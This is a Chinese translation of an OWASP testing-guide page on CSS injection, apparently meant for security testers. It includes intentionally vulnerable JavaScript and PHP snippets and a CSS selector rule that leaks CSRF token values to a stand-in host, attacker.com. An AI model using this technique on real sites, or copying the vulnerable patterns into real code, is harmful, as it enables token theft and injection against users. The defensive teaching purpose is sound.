# 测试 CSS 注入

|ID          |
|------------|
|WSTG-CLNT-05|

## 概述

CSS 注入漏洞涉及在受信任站点的上下文中注入任意 CSS 代码的能力，该代码在受害者浏览器中呈现。此类漏洞的影响因提供的 CSS 载荷而异，可能导致跨站脚本或数据泄露。

当应用程序允许用户提供的 CSS 干扰应用程序的合法样式表时，就会发生此漏洞。在 CSS 上下文中注入代码可能使攻击者能够在某些条件下执行 JavaScript，或使用 CSS 选择器和能够生成 HTTP 请求的函数提取敏感值。通常，允许用户通过提供自定义 CSS 文件来定制页面是一项相当大的风险。

以下 JavaScript 代码显示了一个可能易受攻击的脚本，其中攻击者能够控制 `location.hash`（源），该值到达 `cssText` 函数（接收器）。此特定情况可能在旧版浏览器中导致基于 DOM 的 XSS；更多信息请参见[基于 DOM 的 XSS 防护速查表](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)。

```html
<a id="a1">Click me</a>
<script>
    if (location.hash.slice(1)) {
    document.getElementById("a1").style.cssText = "color: " + location.hash.slice(1);
    }
</script>
```

> **注意：**

 一些基于 CSS 的 JavaScript 执行技术依赖于旧版浏览器的行为（例如，旧版本的 IE 和 Opera）。虽然现代浏览器缓解了大多数这些向量，但 CSS 注入仍然可以实现数据外泄、UI 操纵和攻击链组合。

同样的漏洞可能出现在反射型 XSS 的情况下，例如在以下 PHP 代码中：

```html
<style>
p {
    color: <?php echo $_GET['color']; ?>;
    text-align: center;
}
</style>
```

进一步攻击场景涉及通过采用纯 CSS 规则来提取数据的能力。此类攻击可以通过 CSS 选择器进行，从而导致数据外泄，例如 CSRF 令牌。

以下是一段尝试选择 `name` 匹配 `csrf_token` 且 `value` 以 `a` 开头的输入的代码示例。通过利用暴力破解来确定属性的 `value`，可以发起攻击，将值发送到攻击者的域，例如通过尝试在选择输入元素上设置背景图像。

```html
<style>
input[name=csrf_token][value=^a] {
    background-image: url(https://attacker.com/log?a);
}
</style>
```

Mario Heiderich 在 YouTube 上的演讲 [“Got Your Nose”](https://www.youtube.com/watch?v=FIQvAaZj_HA) 中强调了使用 CSS 等请求内容的其它攻击。

## 测试目标

- 识别 CSS 注入点。
- 评估注入的影响。

## 如何测试

应分析代码，以确定是否允许用户在 CSS 上下文中注入内容。特别是，应检查站点根据输入返回 CSS 规则的方式。

以下是一个基本示例：

```html
<a id="a1">Click me</a>
<b>Hi</b>
<script>
    $("a").click(function(){
        $("b").attr("style","color: " + location.hash.slice(1));
    });
</script>
```

上述代码包含一个由攻击者控制的源 `location.hash`，可以直接注入到 HTML 元素的 `style` 属性中。如上所述，根据所使用的浏览器和提供的载荷，这可能导致不同的结果。
